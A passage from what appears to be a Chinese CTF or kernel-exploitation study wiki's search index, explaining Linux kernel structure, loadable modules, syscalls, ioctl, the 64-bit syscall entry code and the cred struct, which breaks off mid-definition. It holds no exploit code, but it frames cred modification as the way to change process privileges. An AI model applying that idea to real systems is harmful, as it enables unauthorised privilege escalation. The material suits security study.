0\u662f\u5185\u6838\u4f7f\u7528\u7684\u7279\u6743\u7ea7\uff0cRing 3 \u662f\u6240\u6709\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u4f7f\u7528\u7684\u7279\u6743\u7ea7\u3002\u5185\u5c42\u7279\u6743\u7ea7\u53ef\u4ee5\u4f7f\u7528\u5916\u5c42\u7279\u6743\u7ea7\u7684\u8d44\u6e90\u3002\u4f7f\u7528\u8fd9\u79cd\u7684\u7279\u6743\u7ea7\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u64cd\u4f5c\u7cfb\u7edf\u7684\u5b89\u5168\u800c\u8fdb\u884c\u6743\u9650\u9694\u79bb\u3002 Linux\u5185\u6838\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5212\u5206\u4e3a3\u6210\uff0c\u6700\u4e0a\u5c42\u662f\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\uff08SCI\uff0cSystem Call Interface\uff09\uff0c\u5b9e\u73b0\u4e86\u57fa\u672c\u7684\u529f\u80fd\uff0c\u4f8b\u5982open\u3001read\u3001write\u7b49\uff1bSCI\u5c42\u4ee5\u4e0b\u7684\u5185\u6838\u4ee3\u7801\uff0c\u4f9d\u8d56\u4e8e\u4f53\u7cfb\u7ed3\u6784\uff0c\u88ab\u79f0\u4e3aBSP\uff08Board Support Package\uff09\u7684\u90e8\u5206\u3002\u8fd9\u4e9b\u4ee3\u7801\u7528\u4f5c\u7ed9\u5b9a\u4f53\u7cfb\u7ed3\u6784\u7684\u5904\u7406\u5668\u548c\u7279\u5b9a\u4e8e\u5e73\u53f0\u7684\u4ee3\u7801\u3002 Linux \u5185\u6838\u5b9e\u73b0\u4e86\u5f88\u591a\u91cd\u8981\u7684\u4f53\u7cfb\u7ed3\u6784\u5c5e\u6027\u3002\u5728\u6216\u9ad8\u6216\u4f4e\u7684\u5c42\u6b21\u4e0a\uff0c\u5185\u6838\u88ab\u5212\u5206\u4e3a\u591a\u4e2a\u5b50\u7cfb\u7edf\u3002Linux \u4e5f\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u6574\u4f53\uff0c\u56e0\u4e3a\u5b83\u4f1a\u5c06\u6240\u6709\u8fd9\u4e9b\u57fa\u672c\u670d\u52a1\u90fd\u96c6\u6210\u5230\u5185\u6838\u4e2d\u3002\u8fd9\u4e0e\u5fae\u5185\u6838\u7684\u4f53\u7cfb\u7ed3\u6784\u4e0d\u540c\uff0c\u540e\u8005\u4f1a\u63d0\u4f9b\u4e00\u4e9b\u57fa\u672c\u7684\u670d\u52a1\uff0c\u4f8b\u5982\u901a\u4fe1\u3001I/O\u3001\u5185\u5b58\u548c\u8fdb\u7a0b\u7ba1\u7406\uff0c\u66f4\u5177\u4f53\u7684\u670d\u52a1\u90fd\u662f\u63d2\u5165\u5230\u5fae\u5185\u6838\u5c42\u4e2d\u7684\u3002\u6bcf\u79cd\u5185\u6838\u90fd\u6709\u81ea\u5df1\u7684\u4f18\u70b9\u3002Linux\u7f16\u8bd1\u540e\u53ef\u5728\u5927\u91cf\u5904\u7406\u5668\u548c\u5177\u6709\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784\u7ea6\u675f\u548c\u9700\u6c42\u7684\u5e73\u53f0\u4e0a\u8fd0\u884c\u3002\u4e00\u4e2a\u4f8b\u5b50\u662fLinux\u53ef\u4ee5\u5728\u4e00\u4e2a\u5177\u6709\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff08MMU\uff09\u7684\u5904\u7406\u5668\u4e0a\u8fd0\u884c\uff0c\u4e5f\u53ef\u4ee5\u5728\u90a3\u4e9b\u4e0d\u63d0\u4f9bMMU\u7684\u5904\u7406\u5668\u4e0a\u8fd0\u884c\u3002Linux\u5185\u6838\u7684uClinux\u79fb\u690d\u63d0\u4f9b\u4e86\u5bf9\u975eMMU \u7684\u652f\u6301\u3002 \u4e0b\u9762\u4ecb\u7ecdLinux\u5185\u6838\u5305\u542b\u4e86\u54ea\u4e9b\u5185\u5bb9\uff1a \u7cfb\u7edf\u8c03\u7528\u63a5\u53e3 \uff1aSCI \u5c42\u63d0\u4f9b\u4e86\u67d0\u4e9b\u673a\u5236\u6267\u884c\u4ece\u7528\u6237\u7a7a\u95f4\u5230\u5185\u6838\u7684\u51fd\u6570\u8c03\u7528\u3002\u6b63\u5982\u524d\u9762\u8ba8\u8bba\u7684\u4e00\u6837\uff0c\u8fd9\u4e2a\u63a5\u53e3\u4f9d\u8d56\u4e8e\u4f53\u7cfb\u7ed3\u6784\uff0c\u751a\u81f3\u5728\u76f8\u540c\u7684\u5904\u7406\u5668\u5bb6\u65cf\u5185\u4e5f\u662f\u5982\u6b64\u3002SCI \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u975e\u5e38\u6709\u7528\u7684\u51fd\u6570\u8c03\u7528\u591a\u8def\u590d\u7528\u548c\u591a\u8def\u5206\u89e3\u670d\u52a1; \u8fdb\u7a0b\u7ba1\u7406 \uff1a\u8fdb\u7a0b\u7ba1\u7406\u7684\u91cd\u70b9\u662f\u8fdb\u7a0b\u7684\u6267\u884c\u3002\u5728\u5185\u6838\u4e2d\uff0c\u8fd9\u4e9b\u8fdb\u7a0b\u79f0\u4e3a\u7ebf\u7a0b\uff0c\u4ee3\u8868\u4e86\u5355\u72ec\u7684\u5904\u7406\u5668\u865a\u62df\u5316\uff08\u7ebf\u7a0b\u4ee3\u7801\u3001\u6570\u636e\u3001\u5806\u6808\u548cCPU\u5bc4\u5b58\u5668\uff09\u3002\u5728\u7528\u6237\u7a7a\u95f4\uff0c\u901a\u5e38\u4f7f\u7528\u8fdb\u7a0b \u8fd9\u4e2a\u672f\u8bed\uff0c\u4e0d\u8fc7Linux\u5b9e\u73b0\u5e76\u6ca1\u6709\u533a\u5206\u8fd9\u4e24\u4e2a\u6982\u5ff5\uff08\u8fdb\u7a0b\u548c\u7ebf\u7a0b\uff09\u3002\u5185\u6838\u901a\u8fc7SCI\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3\uff08API\uff09\u6765\u521b\u5efa\u4e00\u4e2a\u65b0\u8fdb\u7a0b\uff0c\u505c\u6b62\u8fdb\u7a0b\uff08kill\u3001exit\uff09\uff0c\u5e76\u5728\u5b83\u4eec\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u548c\u540c\u6b65\uff08signal\u6216\u8005POSIX\u673a\u5236\uff09\u3002\u8fdb\u7a0b\u7ba1\u7406\u8fd8\u5305\u62ec\u5904\u7406\u6d3b\u52a8\u8fdb\u7a0b\u4e4b\u95f4\u5171\u4eabCPU\u7684\u9700\u6c42\u3002\u5185\u6838\u5b9e\u73b0\u4e86\u4e00\u79cd\u65b0\u578b\u7684\u8c03\u5ea6\u7b97\u6cd5\uff0c\u4e0d\u7ba1\u6709\u591a\u5c11\u4e2a\u7ebf\u7a0b\u5728\u7ade\u4e89CPU\uff0c\u8fd9\u79cd\u7b97\u6cd5\u90fd\u53ef\u4ee5\u5728\u56fa\u5b9a\u65f6\u95f4\u5185\u8fdb\u884c\u64cd\u4f5c\u3002\u8c03\u5ea6\u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u652f\u6301\u591a\u5904\u7406\u5668\uff08\u79f0\u4e3a\u5bf9\u79f0\u591a\u5904\u7406\u5668\u6216SMP\uff09\uff1b \u5185\u5b58\u7ba1\u7406 \uff1a\u5982\u679c\u7531\u786c\u4ef6\u7ba1\u7406\u865a\u62df\u5185\u5b58\uff0c\u5185\u5b58\u662f\u6309\u7167\u6240\u8c13\u7684\u5185\u5b58\u9875 \u65b9\u5f0f\u8fdb\u884c\u7ba1\u7406\u7684\uff08\u5bf9\u4e8e\u5927\u90e8\u5206\u4f53\u7cfb\u7ed3\u6784\u6765\u8bf4\u90fd\u662f4KB\uff09\u3002Linux\u5305\u62ec\u4e86\u7ba1\u7406\u53ef\u7528\u5185\u5b58\u7684\u65b9\u5f0f\uff0c\u4ee5\u53ca\u7269\u7406\u548c\u865a\u62df\u6620\u5c04\u6240\u4f7f\u7528\u7684\u786c\u4ef6\u673a\u5236\u3002\u4e0d\u8fc7\u5185\u5b58\u7ba1\u7406\u8981\u7ba1\u7406\u7684\u53ef\u4e0d\u6b624KB\u7f13\u51b2\u533a\u3002Linux\u63d0\u4f9b\u4e86\u5bf94KB\u7f13\u51b2\u533a\u7684\u62bd\u8c61\uff0c\u4f8b\u5982slab\u5206\u914d\u5668\u3002\u8fd9\u79cd\u5185\u5b58\u7ba1\u7406\u6a21\u5f0f\u4f7f\u75284KB\u7f13\u51b2\u533a\u4e3a\u57fa\u6570\uff0c\u7136\u540e\u4ece\u4e2d\u5206\u914d\u7ed3\u6784\uff0c\u5e76\u8ddf\u8e2a\u5185\u5b58\u9875\u4f7f\u7528\u60c5\u51b5\uff0c\u6bd4\u5982\u54ea\u4e9b\u5185\u5b58\u9875\u662f\u6ee1\u7684\uff0c\u54ea\u4e9b\u9875\u9762\u6ca1\u6709\u5b8c\u5168\u4f7f\u7528\uff0c\u54ea\u4e9b\u9875\u9762\u4e3a\u7a7a\u3002\u8fd9\u6837\u5c31\u5141\u8bb8\u8be5\u6a21\u5f0f\u6839\u636e\u7cfb\u7edf\u9700\u8981\u6765\u52a8\u6001\u8c03\u6574\u5185\u5b58\u4f7f\u7528\u3002\u4e3a\u4e86\u652f\u6301\u591a\u4e2a\u7528\u6237\u4f7f\u7528\u5185\u5b58\uff0c\u6709\u65f6\u4f1a\u51fa\u73b0\u53ef\u7528\u5185\u5b58\u88ab\u6d88\u8017\u5149\u7684\u60c5\u51b5\u3002\u7531\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u9875\u9762\u53ef\u4ee5\u79fb\u51fa\u5185\u5b58\u5e76\u653e\u5165\u78c1\u76d8\u4e2d\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u79f0\u4e3a\u4ea4\u6362\uff0c\u56e0\u4e3a\u9875\u9762\u4f1a\u88ab\u4ece\u5185\u5b58\u4ea4\u6362\u5230\u786c\u76d8\u4e0a\u3002Linux\u7cfb\u7edf\u4e2d\uff0c\u88ab\u7528\u4e8e\u4ea4\u6362\u7684\u5206\u533a\u53ebswap\u5206\u533a\uff0c\u5728windows\u7cfb\u7edf\u4e0b\u53eb\u505a\u865a\u62df\u5185\u5b58\uff1b \u6587\u4ef6\u7cfb\u7edf \uff1a\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff08VFS\uff09\u662fLinux\u5185\u6838\u4e2d\u975e\u5e38\u6709\u7528\u7684\u4e00\u4e2a\u65b9\u9762\uff0c\u56e0\u4e3a\u5b83\u4e3a\u6587\u4ef6\u7cfb\u7edf\u63d0\u4f9b\u4e86\u4e00\u4e2a\u901a\u7528\u7684\u63a5\u53e3\u62bd\u8c61\u3002VFS\u5728SCI\u548c\u5185\u6838\u6240\u652f\u6301\u7684\u6587\u4ef6\u7cfb\u7edf\u4e4b\u95f4\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4ea4\u6362\u5c42\u3002\u5728VFS\u4e0a\u9762\uff0c\u662f\u5bf9\u8bf8\u5982open\u3001close\u3001read\u548cwrite\u4e4b\u7c7b\u7684\u51fd\u6570\u7684\u4e00\u4e2a\u901a\u7528API\u62bd\u8c61\u3002\u5728VFS\u4e0b\u9762\u662f\u6587\u4ef6\u7cfb\u7edf\u62bd\u8c61\uff0c\u5b83\u5b9a\u4e49\u4e86\u4e0a\u5c42\u51fd\u6570\u7684\u5b9e\u73b0\u65b9\u5f0f\uff1b \u7f51\u7edc\u7ba1\u7406 \uff1a\u7f51\u7edc\u5806\u6808\u5728\u8bbe\u8ba1\u4e0a\u9075\u5faa\u6a21\u62df\u534f\u8bae\u672c\u8eab\u7684\u5206\u5c42\u4f53\u7cfb\u7ed3\u6784\uff1b \u8bbe\u5907\u9a71\u52a8 \uff1aLinux\u5185\u6838\u4e2d\u6709\u5927\u91cf\u4ee3\u7801\u90fd\u5728\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u4e2d\uff0c\u5b83\u4eec\u80fd\u591f\u8fd0\u8f6c\u7279\u5b9a\u7684\u786c\u4ef6\u8bbe\u5907\u3002Linux\u6e90\u7801\u6811\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9a71\u52a8\u7a0b\u5e8f\u5b50\u76ee\u5f55\uff0c\u8fd9\u4e2a\u76ee\u5f55\u53c8\u8fdb\u4e00\u6b65\u5212\u5206\u4e3a\u5404\u79cd\u652f\u6301\u8bbe\u5907\uff0c\u4f8b\u5982 Bluetooth\u3001I2C\u3001serial\u7b49\u3002","title":"Linux\u5185\u6838\u7ed3\u6784"},{"location":"kernel/linux_kernel_base/#_1","text":"\u53ef\u52a0\u8f7d\u6838\u5fc3\u6a21\u5757\uff08Loadable Kernel Modules\uff0c\u7b80\u79f0LKMs\uff09\u662f\u8fd0\u884c\u5728\u5185\u6838\u7a7a\u95f4\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u5305\u62ec\u9a71\u52a8\u7a0b\u5e8f\uff08\u8bbe\u5907\u9a71\u52a8\u3001\u6587\u4ef6\u7cfb\u7edf\u9a71\u52a8\u7b49\uff09\u3001\u5185\u6838\u6269\u5c55\u6a21\u5757\u3002\u5728Linux\u4e2d\uff0cLKMs\u7684\u6587\u4ef6\u683c\u5f0f\u548cRing3\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u683c\u5f0f\u4e00\u6837\uff0c\u5747\u4e3aELF\u6587\u4ef6\u683c\u5f0f\u3002\u6a21\u5757\u53ef\u4ee5\u88ab\u5355\u72ec\u7f16\u8bd1\uff0c\u4f46\u4e0d\u80fd\u5355\u72ec\u8fd0\u884c\u3002\u5b83\u5728\u8fd0\u884c\u65f6\u88ab\u94fe\u63a5\u5230\u5185\u6838\u4f5c\u4e3a\u5185\u6838\u7684\u4e00\u90e8\u5206\u5728\u5185\u6838\u7a7a\u95f4\u8fd0\u884c\uff0c\u8fd9\u4e0e\u8fd0\u884c\u5728\u7528\u6237\u63a7\u4ef6\u7684\u8fdb\u7a0b\u4e0d\u540c\u3002\u6a21\u5757\u901a\u5e38\u7528\u6765\u5b9e\u73b0\u4e00\u79cd\u6587\u4ef6\u7cfb\u7edf\u3001\u4e00\u4e2a\u9a71\u52a8\u7a0b\u5e8f\u6216\u8005\u5176\u4ed6\u5185\u6838\u4e0a\u5c42\u7684\u529f\u80fd\u3002 \u4f7f\u7528LKMs\u7684\u539f\u56e0\u662f\u56e0\u4e3aLinux\u5185\u6838\u672c\u4e8b\u662f\u4e00\u4e2a\u5355\u5185\u6838\uff0c\u6548\u7387\u9ad8\uff0c\u56e0\u4e3a\u6240\u6709\u7684\u5185\u5bb9\u90fd\u96c6\u5408\u5728\u4e00\u8d77\uff0c\u4f46\u662f\u7f3a\u5c11\u53ef\u6269\u5c55\u884c\u548c\u53ef\u7ef4\u62a4\u6027\uff0c\u56e0\u6b64\u9700\u8981\u4f7f\u7528LKMs\u3002\u5927\u90e8\u5206\u7684\u5185\u6838\u9898\u76ee\u57fa\u672c\u90fd\u662f\u4f1a\u5904\u5728LKM\u4e2d\u3002 \u4e0b\u8868\u4e2d\u7ed9\u51fa\u4e86linux\u4e2d\u5e38\u89c1\u7684LKMs\u7684\u64cd\u4f5c\u6307\u4ee4\uff1a \u6307\u4ee4 \u63cf\u8ff0 insmod \u52a0\u8f7d\u6a21\u5757\u5230\u5185\u6838\u4e2d rmmod \u5728\u5185\u6838\u4e2d\u5378\u8f7d\u6a21\u5757 lsmod \u679a\u4e3e\u7cfb\u7edf\u4e2d\u5df2\u7ecf\u52a0\u8f7d\u7684\u6a21\u5757","title":"\u53ef\u52a0\u8f7d\u6838\u5fc3\u6a21\u5757"},{"location":"kernel/linux_kernel_base/#_2","text":"\u7cfb\u7edf\u8c03\u7528\uff08syscall\uff09\u6307\u7528\u6237\u6001\u8fd0\u884c\u7684\u7a0b\u5e8f\u5411\u5185\u6838\u8bf7\u6c42\u9ad8\u6743\u9650\u7684\u670d\u52a1\uff0c\u5176\u672c\u8d28\u662f\u7528\u6237\u6001\u548c\u5185\u6838\u6001\u7684\u63a5\u53e3\u3002\u5f88\u591a\u5e93\u51fd\u6570\uff0c\u6bd4\u5982scanf\u3001puts\u7b49IO\u76f8\u5173\u51fd\u6570\u90fd\u662f\u5bf9\u7cfb\u7edf\u8c03\u7528\u7684\u5c01\u88c5\u3002 man\u624b\u518c\u4e2d\u7684ioctl\uff1a Name ioctl - control device Synopsis #include sys/ioctl.h int ioctl(int d, int request, ...); Description The ioctl() function manipulates the underlying device parameters of special files. In particular, many operating characteristics of character special files (e.g., terminals) may be controlled with ioctl() requests. The argument d must be an open file descriptor. The second argument is a device-dependent request code. The third argument is an untyped pointer to memory. It s traditionally char *argp (from the days before void * was valid C), and will be so named for this discussion. An ioctl() request has encoded in it whether the argument is an in parameter or out parameter, and the size of the argument argp in bytes. Macros and defines used in specifying an ioctl() request are located in the file sys/ioctl.h . Return Value Usually, on success zero is returned. A few ioctl() requests use the return value as an output parameter and return a nonnegative value on success. On error, -1 is returned, and errno is set appropriately. ioctl\u662f\u4e00\u4e2a\u7528\u4e8e\u548c\u8bbe\u5907\u901a\u4fe1\u7684\u7cfb\u7edf\u8c03\u7528\u3002int ioctl(int fd, unsigned long request, ...)\u4e2d\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u6253\u5f00\u8bbe\u5907\u8fd4\u56de\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u7528\u6237\u7a0b\u5e8f\u5bf9\u8bbe\u5907\u7684\u63a7\u5236\u6307\u4ee4\uff0c\u540e\u9762\u7684\u53c2\u6570\u662f\u8865\u5145\u53c2\u6570\uff0c\u548c\u8bbe\u5907\u672c\u8eab\u76f8\u5173\u3002 Linux\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86\u5185\u6838\u8bbf\u95ee\u6807\u51c6\u5916\u90e8\u8bbe\u5907\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u6bd4\u5982IO\u3002\u5f53\u8bbf\u95ee\u975e\u6807\u51c6\u7684\u786c\u4ef6\u8bbe\u5907\u65f6\u56e0\u4e3a\u8fc7\u5206\u590d\u6742\u7684\u60c5\u51b5\uff0c\u662f\u5f88\u96be\u53bb\u63d0\u4f9b\u5145\u8db3\u7684\u7cfb\u7edf\u8c03\u7528\u7684\u3002\u56e0\u6b64\u5185\u6838\u88ab\u8bbe\u8ba1\u4e3a\u53ef\u6269\u5c55\u7684\uff0c\u53ef\u4ee5\u52a0\u5165\u8bbe\u5907\u9a71\u52a8\u6a21\u5757\uff0c\u9a71\u52a8\u4ee3\u7801\u5141\u8bb8\u5728\u5185\u6838\u7a7a\u95f4\u8fd0\u884c\u5e76\u4e14\u53ef\u4ee5\u5bf9\u8bbe\u5907\u76f4\u63a5\u5bfb\u5740\u3002\u4e00\u4e2aioctl\u63a5\u53e3\u5c31\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u7528\u6237\u6001\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\u76f4\u63a5\u8ddf\u8bbe\u5907\u6c9f\u901a\uff0c\u5bf9\u8bbe\u5907\u9a71\u52a8\u7684\u8bf7\u6c42\u662f\u4e00\u4e2a\u4ee5\u8bbe\u5907\u548c\u8bf7\u6c42\u53f7\u7801\u4e3a\u53c2\u6570\u7684ioctl\u8c03\u7528\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u8be6\u7ec6\u4ecb\u7ecd\u4e00\u4e0b\u7cfb\u7edf\u8c03\u7528\u7684\u6d41\u7a0b\u3002Int $0x80\u6307\u4ee4\u7684\u76ee\u7684\u662f\u4ea7\u751f\u4e00\u4e2a\u7f16\u53f7\u4e3a128\u7684\u7f16\u7a0b\u5f02\u5e38\uff0c\u8fd9\u4e2a\u7f16\u7a0b\u5f02\u5e38\u5bf9\u5e94\u7684\u662f\u4e2d\u65ad\u63cf\u8ff0\u7b26\u8868IDT\u4e2d\u7684\u7b2c128\u9879\u2014\u2014\u4e5f\u5c31\u662f\u5bf9\u5e94\u7684\u7cfb\u7edf\u95e8\u63cf\u8ff0\u7b26\u3002\u95e8\u63cf\u8ff0\u7b26\u4e2d\u542b\u6709\u4e00\u4e2a\u9884\u8bbe\u7684\u5185\u6838\u7a7a\u95f4\u5730\u5740\uff0c\u5b83\u6307\u5411\u4e86\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8f\uff1asystem_call()\u3002Linux\u4e3a\u6bcf\u4e2a\u7cfb\u7edf\u8c03\u7528\u90fd\u8fdb\u884c\u4e86\u7f16\u53f7\uff080\u2014NR_syscall\uff09\uff0c\u540c\u65f6\u5728\u5185\u6838\u4e2d\u4fdd\u5b58\u4e86\u4e00\u5f20\u7cfb\u7edf\u8c03\u7528\u8868\uff0c\u8be5\u8868\u4e2d\u4fdd\u5b58\u4e86\u7cfb\u7edf\u8c03\u7528\u7f16\u53f7\u548c\u5176\u5bf9\u5e94\u7684\u670d\u52a1\u4f8b\u7a0b\uff0c\u56e0\u6b64\u5728\u7cfb\u7edf\u8c03\u5165\u901a\u8fc7\u7cfb\u7edf\u95e8\u9677\u5165\u5185\u6838\u524d\uff0c\u9700\u8981\u628a\u7cfb\u7edf\u8c03\u7528\u53f7\u4e00\u5e76\u4f20\u5165\u5185\u6838\uff0c\u5728x86\u4e0a\uff0c\u8fd9\u4e2a\u4f20\u9012\u52a8\u4f5c\u662f\u901a\u8fc7\u5728\u6267\u884cint0x80\u524d\u628a\u8c03\u7528\u53f7\u88c5\u5165eax\u5bc4\u5b58\u5668\u5b9e\u73b0\u7684\u3002\u8fd9\u6837\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8f\u4e00\u65e6\u8fd0\u884c\uff0c\u5c31\u53ef\u4ee5\u4eceeax\u4e2d\u5f97\u5230\u6570\u636e\uff0c\u7136\u540e\u518d\u53bb\u7cfb\u7edf\u8c03\u7528\u8868\u4e2d\u5bfb\u627e\u76f8\u5e94\u670d\u52a1\u4f8b\u7a0b\u4e86\u3002\u9664\u4e86\u9700\u8981\u4f20\u9012\u7cfb\u7edf\u8c03\u7528\u53f7\u4ee5\u5916\uff0c\u8bb8\u591a\u7cfb\u7edf\u8c03\u7528\u8fd8\u9700\u8981\u4f20\u9012\u4e00\u4e9b\u53c2\u6570\u5230\u5185\u6838\uff0c\u6bd4\u5982sys_write(unsigned int fd, const char * buf, size_t count)\u8c03\u7528\u5c31\u9700\u8981\u4f20\u9012\u6587\u4ef6\u63cf\u8ff0\u7b26fd\u3001\u8981\u5199\u5165\u7684\u5185\u5bb9buf\u3001\u4ee5\u53ca\u5199\u5165\u5b57\u8282\u6570count\u7b49\u51e0\u4e2a\u5185\u5bb9\u5230\u5185\u6838\u3002\u78b0\u5230\u8fd9\u79cd\u60c5\u51b5\uff0cLinux\u4f1a\u67096\u4e2a\u5bc4\u5b58\u5668\u53ef\u88ab\u7528\u6765\u4f20\u9012\u8fd9\u4e9b\u53c2\u6570\uff1aeax(\u5b58\u653e\u7cfb\u7edf\u8c03\u7528\u53f7)\u3001ebx\u3001ecx\u3001edx\u3001esi\u53caedi\u6765\u5b58\u653e\u8fd9\u4e9b\u989d\u5916\u7684\u53c2\u6570\u3002\u5f53\u670d\u52a1\u4f8b\u7a0b\u7ed3\u675f\u65f6\uff0csystem_call()\u4eceeax\u83b7\u5f97\u7cfb\u7edf\u8c03\u7528\u7684\u8fd4\u56de\u503c\uff0c\u5e76\u628a\u8fd9\u4e2a\u8fd4\u56de\u503c\u5b58\u653e\u5728\u66fe\u4fdd\u5b58\u7528\u6237\u6001 eax\u5bc4\u5b58\u5668\u6808\u5355\u5143\u7684\u90a3\u4e2a\u4f4d\u7f6e\u4e0a\u3002\u7136\u540e\u8df3\u8f6c\u5230ret_from_sys_call()\uff0c\u7ec8\u6b62\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8f\u7684\u6267\u884c\u3002\u5f53\u8fdb\u7a0b\u6062\u590d\u5b83\u5728\u7528\u6237\u6001\u7684\u6267\u884c\u524d\uff0cRESTORE_ALL\u5b8f\u4f1a\u6062\u590d\u7528\u6237\u8fdb\u5165\u5185\u6838\u524d\u88ab\u4fdd\u7559\u5230\u5806\u6808\u4e2d\u7684\u5bc4\u5b58\u5668\u503c\u3002\u5176\u4e2deax\u8fd4\u56de\u65f6\u4f1a\u5e26\u56de\u7cfb\u7edf\u8c03\u7528\u7684\u8fd4\u56de\u7801\u3002\uff08\u8d1f\u6570\u8bf4\u660e\u8c03\u7528\u9519\u8bef\uff0c0\u6216\u6b63\u6570\u8bf4\u660e\u6b63\u5e38\u5b8c\u6210\uff09","title":"\u7cfb\u7edf\u8c03\u7528"},{"location":"kernel/linux_kernel_base/#_3","text":"CPU\u4ece\u7528\u6237\u6001\u5207\u6362\u5230\u5185\u6838\u6001\u7684\u6761\u4ef6\u662f\u53d1\u751f\u7cfb\u7edf\u8c03\u7528\u3001\u5f02\u5e38\u3001\u5916\u8bbe\u4e2d\u65ad\u7b49\u4e8b\u4ef6\uff0c\u5177\u4f53\u8fc7\u7a0b\u53ef\u4ee5\u53c2\u8003\u5982\u4e0b\u4ee3\u7801\uff1a ENTRY ( entry_SYSCALL_64 ) SWAPGS_UNSAFE_STACK GLOBAL ( entry_SYSCALL_64_after_swapgs ) movq % rsp , PER_CPU_VAR ( rsp_scratch ) movq PER_CPU_VAR ( cpu_current_top_of_stack ), % rsp TRACE_IRQS_OFF /* Construct struct pt_regs on stack */ pushq $ __USER_DS /* pt_regs- ss */ pushq PER_CPU_VAR ( rsp_scratch ) /* pt_regs- sp */ pushq % r11 /* pt_regs- flags */ pushq $ __USER_CS /* pt_regs- cs */ pushq % rcx /* pt_regs- ip */ pushq % rax /* pt_regs- orig_ax */ pushq % rdi /* pt_regs- di */ pushq % rsi /* pt_regs- si */ pushq % rdx /* pt_regs- dx */ pushq % rcx /* pt_regs- cx */ pushq $ - ENOSYS /* pt_regs- ax */ pushq % r8 /* pt_regs- r8 */ pushq % r9 /* pt_regs- r9 */ pushq % r10 /* pt_regs- r10 */ pushq % r11 /* pt_regs- r11 */ sub $ ( 6 * 8 ), % rsp /* pt_regs- bp, bx, r12-15 not saved */ \u901a\u8fc7\u4ee3\u7801\u53ef\u4ee5\u5206\u6790\u51fa\u7528\u6237\u6001\u5207\u6362\u5230\u5185\u6838\u6001\u65f6\u505a\u4e86\u54ea\u4e9b\u4e8b\u60c5\uff08entry_SYSCALL_64\uff09\uff1a \u6267\u884c\u4e86swapgs\u6307\u4ee4\uff0c\u4ea4\u6362GS\u5bc4\u5b58\u5668\u503c\u548c\u7279\u5b9a\u4f4d\u7f6e\u7684\u5185\u6838\u6267\u884c\u65f6\u7684GS\u503c\uff1b \u5c06\u7528\u6237\u7a7a\u95f4\u6808\u9876\u8bb0\u5f55\u5728CPU\u72ec\u5360\u53d8\u91cf\u533a\u57df\u4e2d\uff0c\u5c06CPU\u72ec\u5360\u533a\u57df\u4e2d\u8bb0\u5f55\u7684\u5185\u6838\u6808\u9876\u653e\u5165rsp/esp\uff1b \u901a\u8fc7push\u4fdd\u5b58\u5404\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5f62\u6210\u4e86\u4e00\u4e2apt_regs\u7ed3\u6784\uff1b \u5224\u65ad\u662f\u5426\u4e3ax32_abi\uff1b \u6839\u636e\u7cfb\u7edf\u8c03\u7528\u53f7\u8df3\u5230\u5168\u5c40\u53d8\u91cfsys_call_table\u76f8\u5e94\u4f4d\u7f6e\u7ee7\u7eed\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u3002CPU\u4ece\u5185\u6838\u6001\u56de\u590d\u5230\u7528\u6237\u6001\u65f6\u4f1a\u6267\u884c\uff1a \u901a\u8fc7swapgs\u6062\u590dGS\u503c\uff1b \u901a\u8fc7sysretq\u6216\u8005iretq\u6062\u590d\u7528\u6237\u6001\u7684\u5bc4\u5b58\u5668\u4fe1\u606f\u3002","title":"\u5185\u6838\u5207\u6362\u673a\u5236"},{"location":"kernel/linux_kernel_base/#cred","text":"Kernel\u8bb0\u5f55\u4e86\u8fdb\u7a0b\u7684\u6743\u9650\u7b49\u76f8\u5173\u4fe1\u606f\uff0c\u4f7f\u7528\u5c31\u662fcred\u7ed3\u6784\u4f53\u3002\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u4f1a\u6709\u4e00\u4e2acred\u7ed3\u6784\u4e0e\u5176\u5bf9\u5e94\uff0c\u7ed3\u6784\u4e2d\u5b58\u50a8\u4e86\u8be5\u8fdb\u7a0b\u6743\u9650\u7b49\u4fe1\u606f\uff0c\u4f8b\u5982uid\u3001gid\uff0c\u5982\u679c\u80fd\u591f\u4fee\u6539\u67d0\u4e2a\u8fdb\u7a0b\u7684cred\uff0c\u4e5f\u5c31\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u8fdb\u7a0b\u7684\u6743\u9650\u7684\u4fee\u6539\u3002Cred\u7ed3\u6784\u4f53\u5982\u4e0b\u6240\u793a\uff1a struct cred { atomic_t usage ; #ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers ; /* number of processes subscribed */ void * put_addr ; unsigned magic ; #define CRED_MAGIC 0x43736564 #define CRED_MAGIC_DEAD 0x44656144 #endif kuid_t uid ; /* real UID of the task */ kgid_t gid ; /* real GID of the task */ kuid_t suid ; /* saved UID of the task */ kgid_t sgid 